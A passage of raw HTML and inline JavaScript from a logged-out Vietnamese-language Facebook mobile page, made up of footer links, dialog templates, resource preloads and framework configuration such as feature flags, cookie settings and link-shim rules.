                                Messanger </a><a href="/lite/?refid=8" class="_96qw"
                                                 title="Facebook Lite dành cho Android."> Facebook Lite </a><a
                                href="https://m.facebook.com/watch/?refid=8" class="_96qw"
                                title="Lướt xem video của chúng tôi trên tab Watch."> Watch </a><a
                                href="/directory/people/?refid=8" title="Lướt xem thư mục con người của chúng tôi."
                                class="_96qw">Danh bạ</a><a href="/directory/pages/?refid=8" class="_96qw">Trang</a><a
                                href="/pages/category/?refid=8" class="_96qw">Hạng mục Trang</a><a
                                href="/places/?refid=8" class="_96qw"
                                title="Xem những địa điểm nổi tiếng trên Facebook.">Địa điểm</a><a
                                href="https://facebook.com/games/?refid=8" class="_96qw"
                                title="Xem trò chơi trên Facebook.">Trò chơi</a><a href="/directory/places/?refid=8"
                                                                                   title="Lướt xem thư mục địa điểm của chúng tôi."
                                                                                   class="_96qw">Vị trí</a><a
                                href="/marketplace/?refid=8" class="_96qw" title="Mua bán trên Facebook Marketplace.">Marketplace</a><a
                                href="https://pay.facebook.com/?refid=8" class="_96qw" target="_blank"
                                title="Tìm hiểu thêm về Facebook Pay">Facebook Pay</a><a
                                href="/directory/groups/?refid=8" title="Lướt xem danh mục nhóm." class="_96qw">Nhóm</a><a
                                href="/jobs/?refid=8" class="_96qw"
                                title="Ứng tuyển việc làm và tuyển dụng trên Facebook.">Việc làm</a><a
                                href="https://www.oculus.com/" class="_96qw" target="_blank"
                                title="Tìm hiểu thêm về Oculus">Oculus</a><a href="https://portal.facebook.com/?refid=8"
                                                                             class="_96qw" target="_blank"
                                                                             title="Tìm hiểu thêm về Portal from Facebook">Portal</a><a
                                href="https://lm.facebook.com/l.php?u=https%3A%2F%2Fwww.instagram.com%2F&amp;h=AT1uS7__GrRj6jY8lMCYE3xZim8mH4EK-tlvwgVVe2rI_7lQUI4V8Igc4kxOjSTgVnOKjFp-jygT_vwocfYTLbyvYMf37sQIYHqIsDh9ywzZTHk9wHSL_hkWR_4vVSNwzX9wKrVxtoj4cZhCQKlLig"
                                class="_96qw" title="Hãy xem Instagram" target="_blank" rel="noopener"
                                data-sigil="MLynx_asynclazy">Instagram</a><a
                                href="/local/lists/245019872666104/?refid=8" class="_96qw"
                                title="Lướt xem thư mục Danh sách địa phương của chúng tôi.">Địa phương</a><a
                                href="/fundraisers/?refid=8" class="_96qw"
                                title="Quyên góp cho các mục đích có ý nghĩa.">Chiến dịch gây quỹ</a><a
                                href="/biz/directory/?refid=8" class="_96qw"
                                title="Lướt xem thư mục Dịch vụ Facebook của chúng tôi.">Dịch vụ</a><a
                                href="https://developers.facebook.com/?ref=pf&amp;refid=8" class="_96qw"
                                title="Phát triển trên nền tảng của chúng tôi.">Nhà phát triển</a><a
                                href="/careers/?ref=pf&amp;refid=8" class="_96qw"
                                title="Tạo bước ngoặt mới trong sự nghiệp của bạn với công ty tuyệt vời của chúng tôi">Tuyển
                                dụng</a><a data-nocookies="1" href="/privacy/explanation?refid=8" class="_96qw"
                                           title="Tìm hiểu về quyền riêng tư của bạn và Facebook">Quyền riêng tư</a>
                        </div>
                        <span class="mfss fcg">Facebook, Inc.</span></div>
                </div>
            </div>
        </div>
        <div class=""></div>
        <div class="viewportArea _2v9s" style="display:none" id="u_0_7_wm" data-sigil="marea">
            <div class="_5vsg" id="u_0_8_5+" style="max-height: 180px;"></div>
            <div class="_5vsh" id="u_0_9_pW" style="max-height: 320px;"></div>
            <div class="_5v5d fcg">
                <div class="_2so _2sq _2ss img _50cg" data-animtype="1"
                     data-sigil="m-loading-indicator-animate m-loading-indicator-root"></div>
                Đang tải...
            </div>
        </div>
        <div class="viewportArea aclb" id="mErrorView" style="display:none" data-sigil="marea">
            <div class="container">
                <div class="image"></div>
                <div class="message" data-sigil="error-message"></div>
                <a class="link" data-sigil="MPageError:retry">Thử lại</a></div>
        </div>
    </div>
</div>
<div id="static_templates">
    <div class="mDialog" id="modalDialog" style="display:none" data-sigil=" context-layer-root" data-autoid="autoid_1">
        <div class="_52z5 _451a mFuturePageHeader _1uh1 firstStep titled" id="mDialogHeader">
            <div class="_7om2 _52we">
                <div class="_5s61">
                    <div class="_52z7">
                        <button type="submit" value="Hủy" class="cancelButton btn btnD bgb mfss touchable" id="u_0_b_QK"
                                data-sigil="dialog-cancel-button">Hủy
                        </button>
                        <button type="submit" value="Quay lại" class="backButton btn btnI bgb mfss touchable iconOnly"
                                aria-label="Quay lại" id="u_0_c_RW" data-sigil="dialog-back-button"><i
                                class="img sp_vuppHZ0nD_0 sx_3c65a7" style="margin-top: 2px;"></i></button>
                    </div>
                </div>
                <div class="_4g34">
                    <div class="_52z6">
                        <div class="_50l4 mfsl fcw" id="m-future-page-header-title" role="heading" tabindex="0"
                             data-sigil="m-dialog-header-title dialog-title">Đang tải...
                        </div>
                    </div>
                </div>
                <div class="_5s61">
                    <div class="_52z8" id="modalDialogHeaderButtons"></div>
                </div>
            </div>
        </div>
        <div class="modalDialogView" id="modalDialogView"></div>
        <div class="_5v5d _5v5e fcg" id="dialogSpinner">
            <div class="_2so _2sq _2ss img _50cg" data-animtype="1" id="u_0_a_q4"
                 data-sigil="m-loading-indicator-animate m-loading-indicator-root"></div>
            Đang tải...
        </div>
    </div>
</div>
<script id="u_0_i_je" crossorigin="anonymous"
        src="https://static.xx.fbcdn.net/rsrc.php/v3iaxZ4/yz/l/vi_VN/6qWy4o_Bx8L.js?_nc_x=Ij3Wp8lg5Kz"
        data-bootloader-hash="BGVORZa" nonce=""></script>
<script id="u_0_j_X4" nonce="">requireLazy(["HasteSupportData"], function (m) {
        m.handle({
            "gkxData": {
                "676920": {"result": false, "hash": "AT497IX4gOFG8gZe-Vc"},
                "708253": {"result": false, "hash": "AT5n4hBL3YTMnQWtfe4"},
                "996940": {"result": false, "hash": "AT7opYuEGy3sjG1auGI"},
                "1263340": {"result": false, "hash": "AT5bwizWgDaFQudm4_I"}
            }
        })
    });
    requireLazy(["TimeSliceImpl", "ServerJS"], function (TimeSlice, ServerJS) {
        (new ServerJS()).handle({
            "define": [["BigPipeExperiments", [], {
                "link_images_to_pagelets": false,
                "enable_bigpipe_plugins": false
            }, 907], ["BootloaderConfig", [], {
                "deferBootloads": false,
                "jsRetries": [200, 500],
                "jsRetryAbortNum": 2,
                "jsRetryAbortTime": 5,
                "silentDups": false,
                "hypStep4": false
            }, 329], ["CSSLoaderConfig", [], {
                "timeout": 5000,
                "modulePrefix": "BLCSS:",
                "loadEventSupported": true
            }, 619], ["CurrentCommunityInitialData", [], {}, 490], ["CurrentUserInitialData", [], {
                "ACCOUNT_ID": "0",
                "USER_ID": "0",
                "NAME": "",
                "SHORT_NAME": null,
                "IS_BUSINESS_PERSON_ACCOUNT": false,
                "HAS_SECONDARY_BUSINESS_PERSON": false,
                "IS_MESSENGER_ONLY_USER": false,
                "IS_DEACTIVATED_ALLOWED_ON_MESSENGER": false,
                "IS_MESSENGER_CALL_GUEST_USER": false,
                "IS_WORK_MESSENGER_CALL_GUEST_USER": false,
                "APP_ID": "412378670482",
                "IS_BUSINESS_DOMAIN": false
            }, 270], ["ErrorDebugHooks", [], {"SnapShotHook": null}, 185], ["ISB", [], {}, 330], ["LSD", [], {"token": "AVo6Oy17xFw"}, 323], ["MRequestConfig", [], {
                "dtsg": {
                    "token": "AQGP_GPibx5wu0Q:AQGt--uKuL031uc",
                    "valid_for": 86400,
                    "expire": 1622013961
                },
                "dtsg_ag": {
                    "token": "AQykKdcLMSwpf1kR_KeTGpz1S_RFhfYXPIlZ4RhLOF59fq_Q:AQzaDJf3KwZbgFxyPn70N478DEzuXTVnT-BRhEdL5nkZJwl9",
                    "valid_for": 604800,
                    "expire": 1622532361
                },
                "lsd": "AVo6Oy17xFw",
                "checkResponseOrigin": true,
                "checkResponseToken": true,
                "cleanFinishedRequest": false,
                "cleanFinishedPrefetchRequests": false,
                "ajaxResponseToken": {
                    "secret": "TBB28OL1Xywg3rGD1IhsViya3p9wyz4t",
                    "encrypted": "AYkz97k4CjMnGgxAaYKiKYp6hkQZHZyX2aEAv4epbVZtqdNwRO3ikoun6vERPUw60kx22wl9rh_o5hajFgjokuIXPV4Wn2RMi1TyjPp7cAOeyg"
                }
            }, 51], ["ServerNonce", [], {"ServerNonce": "EXu1n39OCYs42oW9AWnZCq"}, 141], ["SiteData", [], {
                "server_revision": 1003848272,
                "client_revision": 1003848272,
                "tier": "",
                "push_phase": "C3",
                "pkg_cohort": "FW_EXP:mtouch_pkg",
                "haste_session": "18772.FW_EXP:mtouch_pkg.2.0.0.0",
                "pr": 1,
                "haste_site": "mobile",
                "be_one_ahead": false,
                "ir_on": true,
                "is_rtl": false,
                "is_comet": false,
                "is_experimental_tier": false,
                "is_jit_warmed_up": false,
                "hsi": "6966125832479156457-0",
                "semr_host_bucket": "5",
                "bl_hash_version": 2,
                "skip_rd_bl": true,
                "spin": 0,
                "__spin_r": 1003848272,
                "__spin_b": "trunk",
                "__spin_t": 1621927561,
                "vip": "31.13.77.35"
            }, 317], ["SprinkleConfig", [], {
                "param_name": "jazoest",
                "version": 2,
                "should_randomize": false
            }, 2111], ["PromiseUsePolyfillSetImmediateGK", [], {"www_always_use_polyfill_setimmediate": false}, 2190], ["KSConfig", [], {
                "killed": {
                    "__set": ["MLHUB_FLOW_AUTOREFRESH_SEARCH", "NEKO_DISABLE_CREATE_FOR_SAP", "EO_DISABLE_SYSTEM_SERIAL_NUMBER_FREE_TYPING_IN_CPE_NON_CLIENT", "EO_SRT_HELPDESK_DASHBOARD_DISABLE_UNUSED_TAB_IN_RIGHT_PANEL", "MOBILITY_KILL_OLD_VISIBILITY_POSITION_SETTING", "WORKPLACE_DISPLAY_TEXT_EVIDENCE_REPORTING", "BUSINESS_INVITE_FLOW_WITH_SELLER_PROFILE", "ADS_TEMPLATE_UNIFICATION_IN_IG_STORIES", "DCP_CYCLE_COUNT_CLASSIFICATION_UI", "BUY_AT_NEW_START_REQUEST_DSUL_BANNER", "BUY_AT_UI_LINE_DELETE", "BUSINESS_GRAPH_SETTING_APP_ASSIGNED_USERS_NEW_API", "BUSINESS_GRAPH_SETTING_BU_ASSIGNED_USERS_NEW_API", "BUSINESS_GRAPH_SETTING_ESG_ASSIGNED_USERS_NEW_API", "BUSINESS_GRAPH_SETTING_PRODUCT_CATALOG_ASSIGNED_USERS_NEW_API", "BUSINESS_GRAPH_SETTING_SESG_ASSIGNED_USERS_NEW_API", "BUSINESS_GRAPH_SETTING_WABA_ASSIGNED_USERS_NEW_API", "ADS_PLACEMENT_FIX_PUBLISHER_PLATFORMS_MUTATION", "FORCE_FETCH_BOOSTED_COMPONENT_AFTER_ADS_CREATION", "VIDEO_DIMENSIONS_FROM_PLAYER_IN_UPLOAD_DIALOG", "SNIVY_GROUP_BY_EVENT_TRACE_ID_AND_NAME", "ADS_STORE_VISITS_METRICS_DEPRECATION", "DYNAMIC_ADS_SET_CATALOG_AND_PRODUCT_SET_TOGETHER", "AD_DRAFT_ENABLE_SYNCRHONOUS_FRAGMENT_VALIDATION", "NEKO_ENABLE_RESET_SAP_FOR_CREATE_AD_SET_CONTEXTUAL", "LAB_NET_NEW_UI_RELEASE", "HELPDESK_USE_XDS_SEARCHABLE_INPUT_FOR_WORKFLOW", "POCKET_MONSTERS_CREATE", "POCKET_MONSTERS_DELETE", "SRT_BANZAI_SRT_CORE_LOGGER", "SRT_BANZAI_SRT_MAIN_LOGGER", "SIMPL_SAMPLING_HEALTH_CARD", "WORKPLACE_PLATFORM_SECURE_APPS_MAILBOXES", "POCKET_MONSTERS_UPDATE_NAME", "ADS_INTEGRATION_PORTAL_RELAY_LIVE"]
                },
                "ko": {"__set": ["3OsLvnSHNTt", "1G7wJ6bJt9K", "9NpkGYwzrPG", "6fHw06UmAMW", "3oh5Mw86USj", "8NAceEy9JZo", "7FOIzos6XJX", "6xuJHOrdskA", "75fREERrb3F", "80ZDn9dpjEA", "rf8JEPGgOi", "4j36SVzvP3w", "4NSq3ZC4ScE", "53gCxKq281G", "3yzzwBY7Npj", "1onzIv0jH6H", "8PlKuowafe8", "1ntjZ2zgf03", "4SIH2GRVX5W", "2dhqRnqXGLQ", "2WgiNOrHVuC", "amKHb4Cw4WI", "5mNEXob0nTj", "8rDvN9vWdAK", "9cL5o2kjfZo", "DDZhogI19W", "aDayprn6pbH", "acrJTh9WGdp", "1oOE64fL4wO", "9Gd8qgRxn8z", "MPMaqnqZ9c", "4MzX0ipjWq", "5XCz1h9Iaw3", "7r6mSP7ofr2", "5zgf0XOYSz7"]}
            }, 2580], ["JSErrorLoggingConfig", [], {
                "appId": 412378670482,
                "extra": [],
                "reportInterval": 50,
                "sampleWeight": null,
                "sampleWeightKey": "__jssesw"
            }, 2776], ["ImmediateImplementationExperiments", [], {"prefer_message_channel": true}, 3419], ["UriNeedRawQuerySVConfig", [], {"uris": ["dms.netmng.com", "doubleclick.net", "r.msn.com", "watchit.sky.com", "graphite.instagram.com", "www.kfc.co.th", "learn.pantheon.io", "www.landmarkshops.in", "www.ncl.com", "s0.wp.com", "www.tatacliq.com", "bs.serving-sys.com", "kohls.com", "lazada.co.th", "xg4ken.com", "technopark.ru", "officedepot.com.mx", "bestbuy.com.mx", "booking.com"]}, 3871], ["RunGatingConfig", [], {"shouldUseBrowserUnload": true}, 3914], ["InitialCookieConsent", [], {
                "deferCookies": false,
                "initialConsent": {"__set": [1, 2]},
                "noCookies": false,
                "shouldShowCookieBanner": false
            }, 4328], ["TrustedTypesConfig", [], {
                "useTrustedTypes": false,
                "reportOnly": false
            }, 4548], ["WebConnectionClassServerGuess", [], {"connectionClass": "EXCELLENT"}, 4705], ["BootloaderEndpointConfig", [], {
                "debugNoBatching": false,
                "endpointURI": "https:\/\/m.facebook.com\/ajax\/bootloader-endpoint\/"
            }, 5094], ["cr:696703", [], {"__rc": [null, "Aa0UHWfu8NrPr1pBNrgHhHs7FXRN2ioLh1StWXqOXrgnKuaBOud0HQMqG6GFYeR-0SnDIXEiNW4eLgjuKdgMQ-ZQr2c"]}, -1], ["cr:717822", ["TimeSliceImpl"], {"__rc": ["TimeSliceImpl", "Aa0UHWfu8NrPr1pBNrgHhHs7FXRN2ioLh1StWXqOXrgnKuaBOud0HQMqG6GFYeR-0SnDIXEiNW4eLgjuKdgMQ-ZQr2c"]}, -1], ["cr:729414", [], {"__rc": [null, "Aa0KFESPRC7VItdbEBi8yVkjwEJF_JPVqr9ZzbXM30IBgtspSDA3BtlHcEpUU5_9y4mseYPdpRWPhEZXwilzOAP4"]}, -1]],
            "require": [["MPrelude"], ["VisualCompletionGating"], ["RequireDeferredReference", "unblock", [], [["VisualCompletionGating"]]]]
        });
    });</script>
<script>now_inl = (function () {
        var p = window.performance;
        return p && p.now && p.timing && p.timing.navigationStart ? function () {
            return p.now() + p.timing.navigationStart
        } : function () {
            return new Date().getTime()
        };
    })();
    window.__bigPipeFR = now_inl();</script>
<link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/yW/l/0,cross/khJaaYeU64X.css?_nc_x=Ij3Wp8lg5Kz"
      as="style" crossorigin="anonymous">
<link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/yQ/l/0,cross/vaI2Htetpkw.css?_nc_x=Ij3Wp8lg5Kz"
      as="style" crossorigin="anonymous">
<link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/yi/r/jbOKt0eOoTI.js?_nc_x=Ij3Wp8lg5Kz" as="script"
      crossorigin="anonymous" nonce="">
<link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/yw/r/yu1W42PqNcd.js?_nc_x=Ij3Wp8lg5Kz" as="script"
      crossorigin="anonymous" nonce="">
<link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/ym/r/-m5p15RVgSZ.js?_nc_x=Ij3Wp8lg5Kz" as="script"
      crossorigin="anonymous" nonce="">
<link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/yf/r/HptE_o6N-2D.js?_nc_x=Ij3Wp8lg5Kz" as="script"
      crossorigin="anonymous" nonce="">
<link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/yt/r/ahw3tGh_BXM.js?_nc_x=Ij3Wp8lg5Kz" as="script"
      crossorigin="anonymous" nonce="">
<link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3iaxZ4/yz/l/vi_VN/6qWy4o_Bx8L.js?_nc_x=Ij3Wp8lg5Kz"
      as="script" crossorigin="anonymous" nonce="">
<link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/y6/l/0,cross/Rqd66g8ab9q.css?_nc_x=Ij3Wp8lg5Kz"
      as="style" crossorigin="anonymous">
<script>window.__bigPipeCtor = now_inl();
    requireLazy(["BigPipe"], function (BigPipe) {
        define("__bigPipe", [], window.bigPipe = new BigPipe({
            "forceFinish": true,
            "config": {"flush_pagelets_asap": true, "dispatch_pagelet_replayable_actions": false}
        }));
    });</script>
<script nonce="">(function () {
        var n = now_inl();
        requireLazy(["__bigPipe"], function (bigPipe) {
            bigPipe.beforePageletArrive("first_response", n);
        })
    })();</script>
<script nonce="">requireLazy(["__bigPipe"], (function (bigPipe) {
        bigPipe.onPageletArrive({
            displayResources: ["nSxUM1r", "kmcUxH7", "s3cC9PY", "hHxG4He", "4pHGMdE", "2fmZT0K", "/57qFCN", "BGVORZa", "8tsrDhw"],
            id: "first_response",
            phase: 0,
            last_in_phase: true,
            tti_phase: 0,
            all_phases: [63],
            jsmods: {
                define: [["CookieCoreConfig", [], {
                    a11y: {s: "None"},
                    c_user: {s: "None"},
                    cppo: {t: 86400, s: "None"},
                    dpr: {t: 604800, s: "None"},
                    fbl_ci: {t: 31536000, s: "None"},
                    fbl_cs: {t: 31536000, s: "None"},
                    fbl_st: {t: 31536000, s: "Strict"},
                    i_user: {s: "None"},
                    js_ver: {t: 604800, s: "None"},
                    locale: {t: 604800, s: "None"},
                    m_pixel_ratio: {t: 604800, s: "None"},
                    noscript: {s: "None"},
                    presence: {t: 2592000, s: "None"},
                    sfau: {s: "None"},
                    usida: {s: "None"},
                    vpd: {t: 5184000, s: "Lax"},
                    wd: {t: 604800, s: "Lax"},
                    "x-referer": {s: "None"},
                    "x-src": {t: 1, s: "None"}
                }, 2104], ["FbtResultGK", [], {
                    shouldReturnFbtResult: true,
                    inlineMode: "NO_INLINE"
                }, 876], ["IntlPhonologicalRules", [], {
                    meta: {},
                    patterns: {}
                }, 1496], ["IntlViewerContext", [], {GENDER: 3}, 772], ["MJSEnvironment", [], {
                    IS_APPLE_WEBKIT_IOS: false,
                    IS_TABLET: false,
                    IS_ANDROID: false,
                    IS_CHROME: true,
                    IS_FIREFOX: false,
                    IS_WINDOWS_PHONE: false,
                    IS_SAMSUNG_DEVICE: false,
                    OS_VERSION: 10,
                    PIXEL_RATIO: 1,
                    BROWSER_NAME: "Chrome Desktop"
                }, 46], ["MLoadingIndicatorSigils", [], {
                    ANIMATE: "m-loading-indicator-animate",
                    ROOT: "m-loading-indicator-root"
                }, 279], ["NumberFormatConfig", [], {
                    decimalSeparator: ",",
                    numberDelimiter: ".",
                    minDigitsForThousandsSeparator: 4,
                    standardDecimalPatternInfo: {primaryGroupSize: 3, secondaryGroupSize: 3},
                    numberingSystemData: null
                }, 54], ["UserAgentData", [], {
                    browserArchitecture: "64",
                    browserFullVersion: "90.0.4430.212",
                    browserMinorVersion: 0,
                    browserName: "Chrome",
                    browserVersion: 90,
                    deviceName: "Unknown",
                    engineName: "WebKit",
                    engineVersion: "537.36",
                    platformArchitecture: "64",
                    platformName: "Windows",
                    platformVersion: "10",
                    platformFullVersion: "10"
                }, 527], ["ZeroCategoryHeader", [], {}, 1127], ["ZeroRewriteRules", [], {
                    rewrite_rules: {}, whitelist: {
                        "/hr/r": 1,
                        "/hr/p": 1,
                        "/zero/unsupported_browser/": 1,
                        "/zero/policy/optin": 1,
                        "/zero/optin/write/": 1,
                        "/zero/optin/legal/": 1,
                        "/zero/optin/free/": 1,
                        "/about/privacy/": 1,
                        "/about/privacy/update/": 1,
                        "/about/privacy/update": 1,
                        "/zero/toggle/welcome/": 1,
                        "/zero/toggle/nux/": 1,
                        "/zero/toggle/settings/": 1,
                        "/fup/interstitial/": 1,
                        "/work/landing": 1,
                        "/work/login/": 1,
                        "/work/email/": 1,
                        "/ai.php": 1,
                        "/js_dialog_resources/dialog_descriptions_android.json": 0,
                        "/connect/jsdialog/MPlatformAppInvitesJSDialog/": 0,
                        "/connect/jsdialog/MPlatformOAuthShimJSDialog/": 0,
                        "/connect/jsdialog/MPlatformLikeJSDialog/": 0,
                        "/qp/interstitial/": 1,
                        "/qp/action/redirect/": 1,
                        "/qp/action/close/": 1,
                        "/zero/support/ineligible/": 1,
                        "/zero_balance_redirect/": 1,
                        "/zero_balance_redirect": 1,
                        "/zero_balance_redirect/l/": 1,
                        "/l.php": 1,
                        "/lsr.php": 1,
                        "/ajax/dtsg/": 1,
                        "/checkpoint/block/": 1,
                        "/exitdsite": 1,
                        "/zero/balance/pixel/": 1,
                        "/zero/balance/": 1,
                        "/zero/balance/carrier_landing/": 1,
                        "/zero/flex/logging/": 1,
                        "/tr": 1,
                        "/tr/": 1,
                        "/sem_campaigns/sem_pixel_test/": 1,
                        "/bookmarks/flyout/body/": 1,
                        "/zero/subno/": 1,
                        "/confirmemail.php": 1,
                        "/policies/": 1,
                        "/mobile/internetdotorg/classifier/": 1,
                        "/zero/dogfooding": 1,
                        "/xti.php": 1,
                        "/zero/fblite/config/": 1,
                        "/hr/zsh/wc/": 1,
                        "/ajax/bootloader-endpoint/": 1,
                        "/mobile/zero/carrier_page/": 1,
                        "/mobile/zero/carrier_page/education_page/": 1,
                        "/mobile/zero/carrier_page/feature_switch/": 1,
                        "/mobile/zero/carrier_page/settings_page/": 1,
                        "/aloha_check_build": 1,
                        "/upsell/zbd/softnudge/": 1,
                        "/4oh4.php": 1,
                        "/autologin.php": 1,
                        "/birthday_help.php": 1,
                        "/checkpoint/": 1,
                        "/contact-importer/": 1,
                        "/cr.php": 1,
                        "/legal/terms/": 1,
                        "/login.php": 1,
                        "/login/": 1,
                        "/mobile/account/": 1,
                        "/n/": 1,
                        "/remote_test_device/": 1,
                        "/upsell/buy/": 1,
                        "/upsell/buyconfirm/": 1,
                        "/upsell/buyresult/": 1,
                        "/upsell/promos/": 1,
                        "/upsell/continue/": 1,
                        "/upsell/h/promos/": 1,
                        "/upsell/loan/learnmore/": 1,
                        "/upsell/purchase/": 1,
                        "/upsell/promos/upgrade/": 1,
                        "/upsell/buy_redirect/": 1,
                        "/upsell/loan/buyconfirm/": 1,
                        "/upsell/loan/buy/": 1,
                        "/upsell/sms/": 1,
                        "/wap/a/channel/reconnect.php": 1,
                        "/wap/a/nux/wizard/nav.php": 1,
                        "/wap/appreg.php": 1,
                        "/wap/birthday_help.php": 1,
                        "/wap/c.php": 1,
                        "/wap/confirmemail.php": 1,
                        "/wap/cr.php": 1,
                        "/wap/login.php": 1,
                        "/wap/r.php": 1,
                        "/zero/datapolicy": 1,
                        "/a/timezone.php": 1,
                        "/a/bz": 1,
                        "/bz/reliability": 1,
                        "/r.php": 1,
                        "/mr/": 1,
                        "/reg/": 1,
                        "/registration/log/": 1,
                        "/terms/": 1,
                        "/f123/": 1,
                        "/expert/": 1,
                        "/experts/": 1,
                        "/terms/index.php": 1,
                        "/terms.php": 1,
                        "/srr/": 1,
                        "/msite/redirect/": 1,
                        "/fbs/pixel/": 1,
                        "/contactpoint/preconfirmation/": 1,
                        "/contactpoint/cliff/": 1,
                        "/contactpoint/confirm/submit/": 1,
                        "/contactpoint/confirmed/": 1,
                        "/contactpoint/login/": 1,
                        "/preconfirmation/contactpoint_change/": 1,
                        "/help/contact/": 1,
                        "/survey/": 1,
                        "/upsell/loyaltytopup/accept/": 1,
                        "/settings/": 1,
                        "/lite/": 1,
                        "/zero_status_update/": 1,
                        "/operator_store/": 1,
                        "/upsell/": 1,
                        "/wifiauth/login/": 1
                    }
                }, 1478], ["CookieCoreLoggingConfig", [], {
                    maximumIgnorableStallMs: 16.67,
                    sampleRate: 9.7e-5,
                    sampleRateClassic: 1.0e-10,
                    sampleRateFastStale: 1.0e-8
                }, 3401], ["IntlNumberTypeConfig", [], {impl: "return IntlVariations.NUMBER_OTHER;"}, 3405], ["ServerTimeData", [], {
                    serverTime: 1621927561679,
                    timeOfRequestStart: 1621927561586.8,
                    timeOfResponseStart: 1621927561586.8
                }, 5943], ["MobileAppDetect", [], {
                    is_mobile_app: false,
                    is_ads_manager_app: false,
                    is_pages_manager: false,
                    is_facebook_for_android: false,
                    is_facebook_for_android_in_app_browser: false,
                    is_facebook_for_ios: false,
                    is_instagram: false,
                    is_messenger_for_android: false,
                    is_messenger_for_ios: false,
                    is_messenger_lite_for_android: false,
                    is_messenger_lite_for_ios: false,
                    is_wilde: false,
                    is_kaios: false
                }, 1109], ["MWebStorageMonsterWhiteList", [], {
                    whitelist: ["^CacheStorageVersion$", "^RTC_VIDEO_INPUT$", "^RTC_AUDIO_INPUT$", "^RTC_AUDIO_OUTPUT$", "^RTC_IS_AUDIO_ONLY$", "^RTC_NOISE_SUPPRESSION$", "^RTC_MUTE_STATE$", "^Session$", "^_oz_", "^_video_bandwidthEstimate$", "^Banzai$", "^bz", "^banzai\\:last_storage_flush$", "^falco_queue_", "^mutex", "^msys", "^Bandicoot\\:", "^imp_seq_num$", "^qe_switcher_nub_selection$", "^TabId$", "^sp_pi$", "^\\:userchooser\\:osessusers$", "^\\:userchooser\\:settings$", "^brands\\:console\\:config$", "^consoleEnabled$", "^__fb_messenger_desktop_presence_info$", "^vc_", "^_showMDevConsole$", "^ga_client_id$", "^_mswam_$", "^am_recently_used_filters\\:", "^am_image_size_cache$", "^ickt$", "^last_fast_refresh$", "^_ctv_access_token$", "^_ctv_android_device_info$", "^_ctv_cast_access_token$", "^_ctv_casting_remote$", "^_ctv_console_log_viewer_on_full_screen_player_enabled$", "^_ctv_cookie_consent_displayed$", "^_ctv_debug_redux_logger_enabled$", "^_ctv_deviceUniqueIDFallback$", "^_ctv_gaming_consent_displayed$", "^_ctv_installed_app_player_debug_overlay_enabled$", "^_ctv_last_load_time_ms$", "^_ctv_locale$", "^_ctv_logged_out_constraints_sessions_count$", "^_ctv_reloadedDueToStaleApp$", "^_ctv_reloadedDueToUnrecoverableError$", "^_ctv_search_terms$", "^_ctv_tv_experiments$", "^_ctv_usedCloseAppFallback$", "^_ctv_user_sessions$", "^_ctv_video_debug_overlay_enabled$", "^fx_did$"]
                }, 254], ["LinkshimHandlerConfig", [], {
                    supports_meta_referrer: true,
                    default_meta_referrer_policy: "origin-when-crossorigin",
                    switched_meta_referrer_policy: "origin",
                    non_linkshim_lnfb_mode: null,
                    link_react_default_hash: "AT2sCNZcFiR8qr7GKD4jF-8SEror2UMuZB9dq07TZ_U7yd6NqZJSlvB1GUIFV6JIwMSolQR_RDSElCFOnR5Dia9Q1z40AMfOxre3fSrs0OBiMDYhwtV10J4IKosEwvi2ywy1HpIQUkAUv-wBVRUMOA",
                    untrusted_link_default_hash: "AT3Q-mABJ_1b-nYtsKZXI-8lUUYEacoRljyjeMM4vfjORHmyVI6EDkYoJrMY--ZCfu0DkF2-OL5oR4SYJaRVp70wWaFdL9vwhLDF8-7Isyge_cvl_JCFRw6uPBbnlY583Kae0D06DwsweHYOqZ_oSg",
                    linkshim_host: "lm.facebook.com",
                    linkshim_path: "/l.php",
                    linkshim_enc_param: "h",
                    linkshim_url_param: "u",
                    use_rel_no_opener: true,
                    always_use_https: true,
                    onion_always_shim: true,
                    middle_click_requires_event: true,
                    www_safe_js_mode: "asynclazy",
                    m_safe_js_mode: "MLynx_asynclazy",
                    ghl_param_link_shim: false,
                    click_ids: [],
                    is_linkshim_supported: true,
                    current_domain: "facebook.com",
                    blocklisted_domains: ["ad.doubleclick.net", "ads-encryption-url-example.com", "bs.serving-sys.com", "ad.atdmt.com"]
                }, 27], ["MemoryLoggerConfigWebSitevarConfig", [], {measurement_interval_minutes: 5}, 5573], ["FWLoader", [], {}, 278], ["ImmediateActiveSecondsConfig", [], {sampling_rate: 0}, 423], ["MPageControllerGating", [], {
                    shouldDeferUntilCertainNoRedirect: false,
                    shouldReleaseFetcherLock: false,
                    shouldLoadingScreenSetScriptPath: false,
                    shouldRenderAsync404: false
                }, 2023], ["FbtQTOverrides", [], {overrides: {}}, 551], ["AnalyticsCoreData", [], {
                    device_id: "$^|AcaUk8c3hGp6T1TbcyfocbF4xpc_P12WirtDKLS99sa7hw-eJPFeGBTQCK2HC1TKCCn3biGMluLNdh0AWV5SpWl3A_5mxRkYXg|fd.Acbz39tumbFBloi7lscam5IrL2UMMEX1wKkO7kvWGbMcZV7ZkVEprJdURmiDq2_aOzuB2SxUY9rMXZ31R-HsLNlf",
                    app_id: "412378670482",
                    enable_bladerunner: false,
                    enable_ack: false,
                    push_phase: "C3",
                    enable_observer: false
